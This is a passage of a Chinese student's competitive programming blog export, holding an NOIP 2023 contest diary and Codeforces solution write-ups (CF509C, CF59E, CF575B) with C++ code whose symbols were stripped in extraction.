ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"NOIP 2023 摆烂记","path":"/2023/09/29/NOIP2023/","content":"前言已经高三了，但是还是想玩一下，抽空写点题目，顺便记录一下。 【前情提要：本文的撰写具有滞后性，因此流失了大量细节。】 $2023.9.16$初赛，完善程序做得稀烂，好在 $60+$ 还是过线了。真不敢相信今年浙江线会这么低，只有 $50.5 \\rm{pts}$。 $2023.9.29$呃，高三牲的国庆只有 $3$ 天。问老师要了题目，打长乐的模拟赛。 $\\texttt{T1}$ 一看 $10^9$ 的数据范围加 $10^6$ 的询问就猜测是推出式子加上矩阵快速幂优化。手玩小数据推了半天，还很不要脸的用了一下 $\\texttt{OEIS}$，发现 $f_n = f_{n - 1} + f_{n - 3} + 1$，所以就有了一个 $4 \\times 4$ 的矩阵： \\left[ \\begin{array}{ccc}f[n]\\\\f[n - 1]\\\\f[n - 2]\\\\1 \\end{array} \\right] = \\left[ \\begin{array}{ccc}1\\ 0 \\ 1 \\ 1 \\\\ 1 \\ 0 \\ 0 \\ 0 \\\\ 0 \\ 1 \\ 0 \\ 0 \\\\ 0 \\ 0 \\ 0 \\ 1 \\end{array} \\right] ^ {n - 3} \\times \\left[ \\begin{array}{ccc}f[n - 1]\\\\f[n - 2]\\\\f[n - 3]\\\\1 \\end{array} \\right]算了一下时间复杂度是 $O(T \\times 4^3 \\times \\log n)$，好像数据有点大，可能会被卡常，但是没管了先做后面的。 $\\texttt{T2}$ 似乎是个简单题，就是求 $A$ 中有多少段和 $B$ 的长度相同且含 $1$ 的个数相同。由于题目限制了询问串的总长，所以充分利用好根号这一分界线，小于的用记忆化的方式去算，大的直接暴力，时间复杂度 $O(n \\sqrt{L})$。 $\\texttt{T3}$ 染色，大概是要 $\\texttt{dp}$，但是似乎不会。写了一个暴力外加颜色均相同的这一档的递推。 $\\texttt{T4}$ 将 $n$ 个数均分到 $k$ 个集合中，保证每个集合中元素互异。设第 $i$ 个集合中的极差为 $s_i$，求 $\\min (\\sum_{i = 1}^{k} s_i)$。这个暴力看上去也很难打，所以陷入沉思。就在我一直盯着 $n \\le 70$ 的数据范围上时，突然想到了一种乱搞做法：就是每次打乱这 $n$ 个数，然后按顺序塞入 $k$ 个集合中，若所有集合合法，那么更新答案。不断循环最后加上一个卡时就行。试了一下能过样例，真棒！ 预计得分：$80 + 100 + 30 + ???$； 实际得分：$60 + 100 + 20 + 60 = 240 \\texttt{pts}$。 震惊，乱搞做法竟然获得了 $60$ 的高分，这是好的。但是，$\\texttt{T1}$ 被多卡了 $20$，以及 $\\texttt{T3}$ 写了好长的递推的 $10 \\texttt{pts}$ 好像错了没拿到分数。看了一下排名 $\\texttt{rk 4}$ 还不错。 看了题解，第一题是对 $4^3$ 的矩阵转移的优化，倍增预处理然后在询问里用 $1 \\times 4$ 和 $4 \\times 4$ 的矩阵更新。后面两题嘛，看了题解还是实现不出来 qwq。 $2023.9.30$$\\texttt{T1}$ 简单的模拟，本来想着线段树优化求和，但马上发现差分就行了，半小时内就码完了这题。好像还抢到了一血来着。 $\\texttt{T2}$ 竟然做过，是 The Shortest Statement，最短路加最小生成树的好题！但是数据范围有些差异，赛时过于高兴的复制了当时的代码，没仔细看，所以最后因为数组越界 $100 \\to 40$。 $\\texttt{T3}$ 又是一道考察冒泡排序的深度理解的题目，很容易想到按照奇偶位处理，但是发现复杂度怎么搞都是 $O(nm \\log n)$，最后交了暴力上去。赛后订正发现题解的方法很妙，用桶记录数字，然后奇数 $+1$，偶数 $-1$，这样就可转换为数据结构维护极值。 $\\texttt{T4}$ 动归，转移方程很好列： $dp_i = \\max \\{dp_{j|a_i \\ge a_j,0 \\le j \\le i - 1} - \\dfrac{(i - j)(i - j - 1)}{2}\\} + a_i$，答案的更新是 $ans = \\max \\left (ans,dp_i - \\dfrac{(n - i + 1)(n - i)}{2}\\right)$。然后不太会斜率优化以及不太会 $a_i \\ge a_j$ 的处理，所以就实现了一个 $O(n^2)$ 的朴素 $\\texttt{dp}$。由于我并没有处理负数的情况，但是好像部分分的数据有误，所以我爆灵了。 最后得分：$100 + 40 + 30 + 0 = 170$，排名 $\\texttt{rk 15}$。本来应该是：$100 + 100 + 30 + 20 = 250$ 的呜呜呜…… $2023.10.01$$\\texttt{T1}$ 稍作分析就发现这个概率并没什么实际的用处，能到达与根距离为 $k$ 的结点的期望为 $2^{-k}$。直接遍历所有的根求解为 $O(n^2)$，容易想到换根 $\\texttt{dp}$，$f_u = 2^{sz_u - 1} + \\sum_{v \\mid son_u} 2^{sz_u - sz_v - 1} f_v$，时间复杂度就变为 $O(n)$。自己实现的时候直接处理了 $2^{-k}$ 算期望，和标程的转移方程略有不同。 $\\texttt{T2}$ 直接构造若干个完全图，一个完全图的三元环数为 $C_k^3 = \\dfrac {k(k - 1)(k - 2)}{6}$。因此从 $500$ 开始向 $1$ 开始遍历即可。简单题，并拿到了一血。 $\\texttt{T3}$ 赛时在贪心还是动规之间徘徊。还是分析不到位，最后打了个暴力交上去，但是 $\\texttt{WA}$ 了。 $\\texttt{T4}$ 不知怎的，写了一个模拟，也 $\\texttt{WA}$ 了。 最后得分：$100 + 100 + 0 + 0 = 200$，排名 $\\texttt{rk 10}$。 $2023.10.15$打洛谷上的模拟赛，打得有点废，$100 + 8 + 25 + 0 = 133$。 $\\texttt{T1}$ 想的 $\\texttt{dp}$ 一直假，直到机房大佬的点拨以后才勉强写出来。反正花费了很多很多时间。赛后看题解，发现 $\\texttt{ST}$ 表页行，反正赛时啥也不行。 $\\texttt{T2}$ 暴力，然后润。赛后补题，其实也蛮好想的，就是基于二进制位的树上 $\\texttt{dp}$，设 $g[u][i][0/1]$ 表示以 $u $为根的子树内，所有断边方案中价值在二进制下第 $i$ 位为 $0/1$ 的不与 $u$ 相连的联通块的价值乘积的和. $\\texttt{T3}$ 暴力大分讨，然后润。正解是区间 $\\texttt{dp}$，时间复杂度 $O(Tn^3)$，看题解吧，思路就不写了。 $\\texttt{T4}$ 没看，直接润。 $2023.10.21$比赛日！$\\texttt{rp++}$！ $\\texttt{T1}$ 水题，直接暴力搜索，然后过大样例。 $\\texttt{T2}$ 字符串消消乐，想了半天只会 $O(n^3)$ 的区间 $\\texttt{dp}$，之后一直没有进展。害，其实出考场才发现 $O(n^2)$ 的做法也蛮好想的。当然，正解是线性做法，发现从 $1$ 到 $n$ 维护栈序列时，若对于某个时刻 $l$ 和某个时刻 $r$，两种时刻的栈序列完全相同，那么说明子串 $(l+1,r)$ 一定是可消除。 $\\texttt{T3}$ 大模拟，写了半天放弃了最后一题，最后因为看错一丢丢题干，喜提 $0 \\texttt{ pts}$。不说了，赛后写了 $3.02 \\texttt{KB}$ 苟过了。放个代码纪念一下： #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;int n;ll p;//所有变量的内存指针 struct ele //定义一个变量 ll len,ali_len;//占据空间 对齐要求 string ty,name;//类型 变量名称 ;struct stct ll len,ali_len; string name; vector ele v;//记录结构体内的每一个变量 stct () len = ali_len = 0;name = ;v.clear (); tot;//记录所有的变量的一个大结构体 map string,int bs;//4 个基本类型map string,stct ext;//自定义类型 void init_basic ();void calc (ll p,ll x);void op_one ();void op_two ();void op_three ();void op_four ();int main ()// freopen (.in,r,stdin);// freopen (.out,w,stdout); cinn;init_basic (); for (int i = 1;i = n;++i) int ty;cinty; if (ty == 1) op_one (); if (ty == 2) op_two (); if (ty == 3) op_three (); if (ty == 4) op_four (); return 0;void init_basic () bs[byte] = 1;bs[short] = 2;bs[int] = 4;bs[long] = 8; void calc (ll poi,ll ali) poi = ceil ((long double) poi / ali) * ali;//当前地址 对齐要求 //tmp 表示新的结构体 nw 表示新的变量 void op_one () int k;stct tmp;cintmp.namek; for (int i = 1;i = k;++i) ele nw;cinnw.tynw.name; if (bs[nw.ty]) nw.len = nw.ali_len = bs[nw.ty];//基本类型 else nw.len = ext[nw.ty].len,nw.ali_len = ext[nw.ty].ali_len;//自定义类型 tmp.ali_len = max (tmp.ali_len,nw.ali_len);tmp.v.push_back (nw);//计算对齐要求 在结构体中加入变量 calc (tmp.len,nw.ali_len);tmp.len += nw.len;//地址偏移的处理 长度更新 calc (tmp.len,tmp.ali_len); ext[tmp.name] = tmp;//加入一个新的结构体 printf (%lld %lld ,tmp.len,tmp.ali_len); void op_two () ele nw;ll ans = 0;cinnw.tynw.name; for (ele x : tot.v) calc (ans,x.ali_len),ans += x.len; calc (ans,bs[nw.ty] ? bs[nw.ty] : ext[nw.ty].ali_len); tot.v.push_back (bs[nw.ty] ? bs[nw.ty] : ext[nw.ty].len,bs[nw.ty] ? bs[nw.ty] : ext[nw.ty].ali_len,nw.ty,nw.name);//将新变量加入的总的结构体中 printf (%lld ,ans);void op_three () string s;stct tmp = tot;ll ans = 0;cins; for (int i = 0,j;i s.size ();i = j + 1) j = i; while (j s.size () s[j] != .) ++j; string nw = s.substr (i,j - i);//以 . 分隔层层取出变量 for (ele x : tmp.v) calc (ans,x.ali_len); if (x.name == nw) tmp = ext[x.ty];break;//层层深入 ans += x.len; printf (%lld ,ans);void op_four () stct tmp = tot;ll sum = 0,k,ok;cink; while (1) ok = 0; for (ele x : tmp.v) calc (sum,x.ali_len); if (sum = k k sum + x.len)//在某个变量的区间中 if (bs[x.ty]) ok = 1;break;//是最小单元，说明存在解 tmp = ext[x.ty];//向内层走 ok = 2;break; sum += x.len; if (sum k) ok = 0;break; if (!ok || ok == 1) break; if (!ok) puts (ERR);return ; sum = 0;tmp = tot; while (1) for (ele x : tmp.v) calc (sum,x.ali_len); if (sum = k k sum + x.len) coutx.name; if (bs[x.ty]) puts ();return ; tmp = ext[x.ty];cout.; break; sum += x.len; $\\texttt{T4}$ 其实但凡做了这题目多少也可得点分。（后悔.jpg)。树上的二分套二分，显然二分天数以及至少要中的时间，唯一的坑点就是可能爆 $\\texttt{long long}$。 得分：$100 + 35 + 0 + 0 = 135$。为什么要写大模拟！！！为什么不做 $\\texttt{T4}$！！！【所以依旧获得 $2=$】 $2023.11.8$市一模考完，润到机房！（奈斯的安排，第三天上午就考完！【笑死我，有的人，在别人全考完的时候还没开始考……】） 【$\\texttt{PS}$:喜提年排 $28$，$\\texttt{OI}$ 助我一臂之力。】 下午做洛谷模拟赛。 $\\texttt{T1}$ 数论题，翻译一下就是给长度为 $n$ 的序列 $a$ 和一个数 $w$，每次操作你可以选择一个 $a_i$ 使得 $a_i = a_i + 1$，至多操作 $w$ 次，最大化 $\\Pi_{i = 1}^{w} a_i$。做法就是贪心选择最小值，$O(n^2)$ 即可。 $\\texttt{T2}$ 找规律（赛时没找到，寄），在直到规律后，代码短的离谱。 $\\texttt{T3，T4}$ 好像没做。 $2023.11.12-14$翘了运动会，打三套模拟赛，做 $\\texttt{NOIP}$ 最后的冲刺。反正打得不错，具体就不写了。 $2023.11.18$比赛日。 $\\texttt{8:30}$ 开始比赛，用福昕阅读器解码 $\\texttt{pdf}$ 多次失败，后来说要从浏览器这里打开才行…… $\\texttt{8:35}$ 写完缺省，开始读题。似乎是模拟 $+$ 图论 $+$ 盲猜数据结构 $+$ 盲猜数据结构/动态规划，猜的还挺准的。 $\\texttt{8:45}$ 开始写 $\\texttt{T1}$，真的是三年来最简单的签到题，记录一下最大最小值，然后直接 $O(n^2)$ 判断即可。 $\\texttt{9:00}$ 写完，开始看 $\\texttt{T2}$，发现有 $\\texttt{40 pts}$ 是送的，直接敲。然后开始想正解，其间一直没用想通一个能成环的样例，所以一直手模构造，好像花了很久，然后尝试写了代码，但是一直出不来。代码越改越乱，大样例全过不了，稍微有点慌。这时候大概已经 $\\texttt{10:20}$ 的样子了，吸取了之前的教训，出去上了个厕所，直接开写 $\\texttt{T3}$。 想到一个 $\\texttt{35 pts}$ 的朴素 $\\texttt{dp}$，设 $dp_{i,j}$ 表示 $X$ 匹配到第 $i$ 位，$Y$ 匹配到第 $j$ 位是否可行，所以就有转移 $dp_{i,j} = dp_{i - 1,j} | dp_{i,j - 1} | dp_{i - 1,j - 1}$。整一个想完写完大概 $\\texttt{11:40}$，拍了大样例，能过，一阵狂喜，然后开最后一题。 按照赛前“没思路就写 $\\texttt{dp}$”的策略，很快想出一个 $\\texttt{36 pts}$ 的 $\\texttt{dp}$，$dp_{i,j}$ 表示到第 $i$ 天时，$(j,i)$ 区间均打卡而第 $j - 1$ 天不打卡的最大能量。差不多 $\\texttt{12:30}$，测大样例，突然发现有问题。一顿检查后发现是初始化的锅，修了以后所以大样例都能过。写完以后怕被卡常，在判断 $(j,i)$ 区间的代码中利用 vector 加了一个二分，改完以后继续按原程序对拍，还真个我拍出错来了，发现还是初始化的问题，赶紧改！ $\\texttt{12:45}$，不写了，开始检查文件名，路径，freopen 等等。 $\\texttt{13:00}$，比赛结束，感觉还行，估分 $100 + 40 + 25 + 36 = 211$。 后记 这场比赛还是有一点点不满意。$\\texttt{T2}$ 应该是要写出来的，考场上想得太乱把自己绕进去了。$\\texttt{T4}$ 还有离散化的那一部分分没看见，这是可以拿到的；好像还有 $\\texttt{10 pts}$ 的特殊部分也没看见…… 感谢 $\\texttt{CCF}$ 没有卡 $\\texttt{T3}$ 的大常数做法（虽然能够通过读入时的特判解决这个问题）。以及 $\\texttt{T2}$ 暴力不小心把 $n$ 打成了 $m$，但由于暴力肯定是卡满的，所以出的数据全部都 $n = m$（属于是逃过一劫了）。 出分啦，和自己估的一毛一样。感觉有点悬，祈祷初中生能去除的多一点。 出分数线啦！$206$！终于终于终于一等奖嘞！！！上体育课前同学来告诉我的，让我给激动得不得了。 初高中的 $\\texttt{OI}$ 总算有了闭环，或许整个过程看上去很艰难，经历了停文化课，比赛失利等困难，但是我真的乐在其中。不论是洛谷的月赛，还是 $\\texttt{CF}$ 的深夜鏖战，总之努力没有白费！！！ 高中的竞赛算是结束了，但是洛谷的账号我是不会废滴，希望我在大学是能参加 $\\texttt{ACM}$，然后继续开始写我的题解，赚我的咕值，提升我的排名！！！ 最后最后，纪念一下我比赛的四道题的赛时代码。 //T1 #include bits/stdc++.h#define ll long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 3e3 + 5;const int MOD = 1e9 + 7;inline int read ();int n,m,mx[MAX],mn[MAX];char s[MAX][MAX];int main () n = read ();m = read (); for (int i = 1;i = n;++i) mn[i] = INF; for (int i = 1;i = n;++i) scanf (%s,s[i] + 1); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) mx[i] = max (mx[i],s[i][j] - a),mn[i] = min (mn[i],s[i][j] - a); for (int i = 1;i = n;++i) int ok = 1; for (int j = 1;j = n;++j) if (i == j) continue; if (mn[i] = mx[j]) ok = 0;break; if (ok) printf (1); else printf (0); puts (); return 0;inline int read () int s = 0,f = 1; char ch = getchar (); while ((0 ch || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (0 = ch ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;//T2#include bits/stdc++.h#define ll long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int ty,t,n,m,cnt,ans,vis[MAX],a[MAX],b[MAX],st[MAX];//st[i] for i,the prioritychar str[30][2];int x[30],y[30];vector pair int,int ve[MAX];void dfs (int u,int ti);void solve (int x);bool check ();int main ()// freopen (tribool.in,r,stdin);// freopen (tribool.out,w,stdout); ty = read ();t = read (); if (ty = 2) while (t--) n = read ();m = read ();ans = INF; for (int i = 1;i = m;++i) scanf (%s,str[i]);x[i] = read (); if (str[i][0] == + || str[i][0] == -) y[i] = read (); solve (1); printf (%d ,ans); return 0; while (t--) n = read ();m = read ();cnt = 0; for (int i = 1;i = n;++i) a[i] = 0,st[i] = 0,ve[i].clear (); for (int i = 1;i = m;++i) char s[2];scanf (%s,s); if (s[0] == +) int x = read (),y = read (); ve[y].push_back (x,i); st[x] = i; for (int j = 1;j = n;++j) vis[j] = 0; dfs (y,i); else if (s[0] == -) int x = read (),y = read (); else int x = read (); if (s[0] == T) a[x] = 1; if (s[0] == F) a[x] = 2; if (s[0] == U) a[x] = 3; if (ty = 5) st[x] = i; for (int j = 1;j = n;++j) vis[j] = 0; dfs (x,i); for (int i = 1;i = n;++i) if (a[i] == 3) ++cnt; printf (%d ,cnt); return 0;inline int read () int s = 0,f = 1; char ch = getchar (); while ((0 ch || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (0 = ch ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void dfs (int u,int ti) vis[u] = 1; for (int i = 0;i ve[u].size ();++i) int v = ve[u][i].first; if (vis[v] || st[v] != ve[u][i].second) continue; a[v] = a[u];//st[v] = ti; dfs (v,ti); void solve (int x) if (x == n + 1) if (check ()) int sum = 0; for (int i = 1;i = n;++i) sum += (a[i] == 3); ans = min (ans,sum); return ; for (int i = 1;i = 3;++i) a[x] = i,solve (x + 1);bool check () for (int i = 1;i = n;++i) b[i] = a[i]; for (int i = 1;i = m;++i) if (str[i][0] == +) b[x[i]] = b[y[i]]; else if (str[i][0] == -) if (b[y[i]] == 3) b[x[i]] = b[y[i]]; else b[x[i]] = 3 - b[y[i]]; else if (str[i][0] == F) b[x[i]] = 1; if (str[i][0] == T) b[x[i]] = 2; if (str[i][0] == U) b[x[i]] = 3; for (int i = 1;i = n;++i) if (a[i] != b[i]) return 0; return 1;//T3#include bits/stdc++.h#define ll long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e3 + 5;const int MOD = 1e9 + 7;inline int read ();int ty,n,m,q,ans,a[MAX],b[MAX],c[MAX],d[MAX],dp[MAX][MAX];bool check1 ();bool check2 ();int main ()// freopen (expand.in,r,stdin);// freopen (expand.out,w,stdout); ty = read ();n = read ();m = read ();q = read (); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = m;++i) b[i] = read (); if (a[1] b[1]) ans = check1 (); else ans = check2 (); printf (%d,ans); while (q--) int dx = read (),dy = read (); for (int i = 1;i = n;++i) c[i] = a[i]; for (int i = 1;i = m;++i) d[i] = b[i]; while (dx--) int x = read (),y = read (); a[x] = y; while (dy--) int x = read (),y = read (); b[x] = y; if (a[1] b[1]) ans = check1 (); else ans = check2 (); printf (%d,ans); for (int i = 1;i = n;++i) a[i] = c[i]; for (int i = 1;i = m;++i) b[i] = d[i]; puts (); return 0;inline int read () int s = 0,f = 1; char ch = getchar (); while ((0 ch || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (0 = ch ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool check1 () for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) dp[i][j] = 0; dp[1][1] = (a[1] b[1]); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) if (i == 1 j == 1) continue; if (a[i] = b[j]) continue; dp[i][j] |= dp[i][j - 1]; dp[i][j] |= dp[i - 1][j - 1]; dp[i][j] |= dp[i - 1][j]; return dp[n][m];bool check2 () for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) dp[i][j] = 0; dp[1][1] = (a[1] b[1]); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) if (i == 1 j == 1) continue; if (a[i] = b[j]) continue; dp[i][j] |= dp[i][j - 1]; dp[i][j] |= dp[i - 1][j - 1]; dp[i][j] |= dp[i - 1][j]; return dp[n][m];//T4#include bits/stdc++.h#define ll long long#define INF 0x3f3f3f3f3f3f3f3fusing namespace std;const int MAX = 1e3 + 5;const int MOD = 1e9 + 7;inline int read ();struct node int ti;ll v; ;int ty,t,n,m,k,d;ll ans,dp[MAX][MAX];vector node p[MAX];vector ll sum[MAX];bool cmp (node x,node y);ll check (int x,int y);int main ()// freopen (run.in,r,stdin);// freopen (run.out,w,stdout); ty = read ();t = read (); while (t--) n = read ();m = read ();k = read ();d = read (); for (int i = 1;i = n;++i) for (int j = 0;j = min (n,k);++j) dp[i][j] = -INF; ans = -INF; for (int i = 1;i = m;++i) int x = read (),y = read (),v = read (); p[x].push_back (x - y + 1,v); for (int i = 1;i = n;++i) sort (p[i].begin (),p[i].end (),cmp); for (int i = 1;i = n;++i) if (!p[i].size ()) continue; sum[i].push_back (p[i][0].v); for (int j = 1;j p[i].size ();++j) sum[i].push_back (sum[i][j - 1] + p[i][j].v); dp[0][0] = 0; for (int i = 1;i = n;++i) for (int j = 0;j = min (i,k);++j) int l = max (i - j + 1,1),r = i; dp[i][0] = max (dp[i][0],dp[i - 1][j]); if (j) dp[i][j] = max (dp[i][j],dp[i - 1][j - 1] + check (l,r) - d); for (int i = 0;i = min (n,k);++i) ans = max (ans,dp[n][i]); printf (%lld ,ans); for (int i = 1;i = n;++i) p[i].clear (),sum[i].clear (); for (int i = 1;i = n;++i) for (int j = 0;j = min (n,k);++j) dp[i][j] = -INF; return 0;inline int read () int s = 0,f = 1; char ch = getchar (); while ((0 ch || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (0 = ch ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool cmp (node x,node y) return x.ti y.ti;ll check (int x,int y) int l = 0,r = p[y].size () - 1,ans = -1; while (l = r) int mid = (l + r) 1; if (x = p[y][mid].ti) ans = mid,r = mid - 1; else l = mid + 1; if (ans == -1) return 0; if (ans == 0) return sum[y][sum[y].size () - 1]; else return sum[y][sum[y].size () - 1] - sum[y][ans - 1];","categories":["Journal"]},{"title":"题解：CF509C Sums of Digits","path":"/2023/05/21/CF509C/","content":"一道很好的构造题。简单来说，给你一个序列 $\\{b\\}$，$b_i$ 表示 $a_i$ 各位数字之和，请还原出序列 $\\{a\\}$。有两个附加条件，一是序列 $\\{a\\}$ 单增，二是 $\\{a\\}$ 尽可能的小。 对于第二个条件，很容易想到要贪心求解。倘若没有第一个条件，那么显然 $b_i = 9a+b(0b9)$ 的形式是最优的，即还原出的数形如 $b99\\cdots9$。那么有第一个条件时，不难想到根据 $b_{i - 1}$ 与 $b_i$ 的大小进行分类讨论。 先从 $b_{i - 1} b_i$ 这种简单的情况看起。相较于前一个数，只需要把多的部分 $b_i - b_{i - 1}$ 按照贪心的思想去填入即可。举个栗子，如果 $a_{i - 1} = 129$，多出了 $8$ 需要填，那么在 $2$ 上加上 $7$ 补成最大的上限 $9$，然后将剩余的 $8 - 7 = 1$ 填入 $1$，最后变成了 $299$。 再来看 $b_{i - 1} \\ge b_i$ 的情况。从低位往高位找到第一个不是 $9$ 的位置，尝试将该位加 $1$，往高位的方向均不变，往低位的方向重新排列。这里需要注意是否合法（也就是剩余数字之和在减去那些已经确定的数后是否大于等于 $0$）。当然，往低位的方向的排列方式直接按照贪心的思路即可。若位数不够，则需要补 $0$，这也是为什么之前判断合法时只需要满足大于等于 $0$ 即可。如果全部遍历完也未出现可以填的，那么只能新开一位并填上 $1$，然后剩下的按照贪心的思路即可。 在编写代码的时候，分类三种构造的函数。第一种是无条件限制，直接贪心填入。第二种是弱依赖，即需要补充多的部分的第一种情况。第三种便是需要较大改动的第二种情况，其中按照贪心进行填入的部分直接调用第一个函数即可。 完整代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,a[MAX];string ans[MAX];string easy_make (int x);string medium_make (string la,int x);string hard_make (string la,int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = n;++i) if (i == 1) ans[i] = easy_make (a[i]); else if (a[i] a[i - 1]) ans[i] = medium_make (ans[i - 1],a[i]); else ans[i] = hard_make (ans[i - 1],a[i]); for (int i = 1;i = n;++i) coutans[i]endl; return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;string easy_make (int x)//直接贪心填入 string s = ; for (int i = 1;i = x / 9;++i) s += 9; x %= 9; if (x) s = char (x + 48) + s; return s;string medium_make (string la,int x) int len = la.size ();int sum = x; string s = ; for (int i = 0;i len;++i) sum -= la[i] - 0; for (int i = len - 1;~i;--i) if (!sum) s = la[i] + s; else s = char (la[i] + min (9 - (la[i] - 0),sum)) + s,sum -= min (9 - (la[i] - 0),sum);//尽量凑成 9 return easy_make (sum) + s;string hard_make (string la,int x) int len = la.size (); for (int i = len - 1;~i;--i) if (la[i] != 9) string s = ;int sum = 0; for (int j = 0;j i;++j) s += la[j],sum += la[j] - 0; s += char (la[i] + 1);sum += la[i] - 0 + 1; if (x - sum 0) continue;//要合法才行 string nw = easy_make (x - sum); int p = len - s.size () - nw.size (); for (int j = 1;j = p;++j) s += 0;//补 0 保证 ans_i 单调递增 return s + nw; string s = 1;++len;//直接新开一位 string nw = easy_make (x - 1); int p = len - s.size () - nw.size (); for (int i = 1;i = p;++i) s += 0;//补 0 保证 ans_i 单调递增 return s + nw;","categories":["Solution"]},{"title":"题解：CF59E Shortest Path","path":"/2023/05/08/CF59E/","content":"对于 $k$ 对有序的三元组 $(x,y,z)$ 为不能走的路线。本题对选择恰当的工具存储三元组有着较高的要求。 首先想到的是 map 与 set，令 set int ban[x][y] 记录形如 $x \\to y \\to z_i$ 的所有 $z_i$。进行广度优先搜索，记录一个点 $u$ 的前驱 $p$ 点的同时遍历后继节点 $v$，若 $(u,v,z)$ 合法，即 ban[x][y].find (z) == ban[x][y].end ()，同时该路径可以更新，那么加入队列中去并记录下前驱节点（用于路径的输出）。于是得到了以下核心代码： set int ban[MAX][MAX];void bfs () q.push (0,1); while (!q.empty ()) pair int,int x = q.front ();q.pop (); int p = x.first,u = x.second; if (u == n) printf (%d ,dis[p][u]); print (p,u); ok = 1;puts (); return ; for (auto v : ve[u]) if (ban[p][u].find (v) == ban[p][u].end () !dis[u][v]) pre[u][v] = p;dis[u][v] = dis[p][u] + 1; q.push (u,v); 虽然能过样例，可是……一交发现 $\\texttt{MLE}$。仔细一看 $k$ 的范围，直接寄。于是尝试用哈希来优化空间。大体思路相同，而这次用 $xyz+x+y+z$ 对大质数 $p$ 的值来表示 $(x,y,z)$，考虑到重复，用 vector tri hsh[M] 来记录同一个值的不同三元组，这样空间便可大大降低，可以通过此题。代码如下: #include iostream#include cstdio#include algorithm#include cmath#include cstring#include queue#include set#include vector#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 3005;const int M = 999983;const int MOD = 1e9 + 7;inline int read ();struct tri int x,y,z;;int n,m,k,ok,dis[MAX][MAX],pre[MAX][MAX];vector int ve[MAX];vector tri hsh[M];queue pair int,int q;int get (int x,int y,int z);void add (int u,int v);bool check (int x,int y,int z);void bfs ();void print (int u,int v);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read ();k = read (); for (int i = 1;i = m;++i) int x = read (),y = read (); ve[x].push_back (y);ve[y].push_back (x); for (int i = 1;i = k;++i) int x = read (),y = read (),z = read (); hsh[get (x,y,z)].push_back ((tri)x,y,z); bfs (); if (!ok) puts (-1); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;int get (int x,int y,int z)//进行哈希操作 return (1ll * x * y * z % M + 1ll * x + 1ll * y + 1ll * z) % M;bool check (int x,int y,int z)//检测是否合法 for (auto tmp : hsh[get (x,y,z)]) if (tmp.x == x tmp.y == y tmp.z == z) return 1; return 0;void bfs () q.push (0,1); while (!q.empty ()) pair int,int x = q.front ();q.pop (); int p = x.first,u = x.second; if (u == n) printf (%d ,dis[p][u]);//输出路径长度 print (p,u); ok = 1;puts (); return ; for (auto v : ve[u]) if (!check (p,u,v) !dis[u][v])//合法且能过更新 pre[u][v] = p;dis[u][v] = dis[p][u] + 1; q.push (u,v); void print (int u,int v)// 递归输出路径 if (!v) return ;//终止条件 print (pre[u][v],u); printf (%d ,v);","categories":["Solution"]},{"title":"题解：CF575B Bribes","path":"/2023/01/26/CF575B/","content":"由题可知这是一棵树，因此求每一条边经过的次数可以通过树上差分解决。而现在只有部分（有向）边需要花费，因此就需要找到一种能够记录单向花费的信息。考虑到一条边连接的两个点因在树上而深度不同，所以可以分为叶子指向父节点与父节点指向叶子两种边。形象化地，第一种可以称为上行边，第二种称为下行边。 首先通过树上差分，将信息分别储存在上行边的起点与下行边的中点。 for (int i = 1;i = k;++i) int lca = getLCA (a[i],a[i - 1]); ++up[a[i - 1]];++down[a[i]];//up 加的位置为起点，down 加的位置为终点 --up[lca];--down[lca]; 然后通过一次 dfs 和差分数组还原每一条边经过的次数。最后统计答案，对于一条 $v \\to u$ 需要花费的边，若是上行边，那么通过的次数记录在 $v$ 上，否则是 $u$ 上。设某条边经过了 $x$ 次，则总花费为 $1 + 2 + \\cdots + 2^{x - 1} = 2^x - 1$，所以直接预处理 $2$ 的幂次即可。 总代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#include vector#include map#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,k,a[MAX * 10],f[MAX][20],dep[MAX],up[MAX],down[MAX];vector int ve[MAX];map pair int,int,int co;ll ans,pw[MAX * 10];int getLCA (int x,int y);void dfs (int u,int fa);int main () //freopen 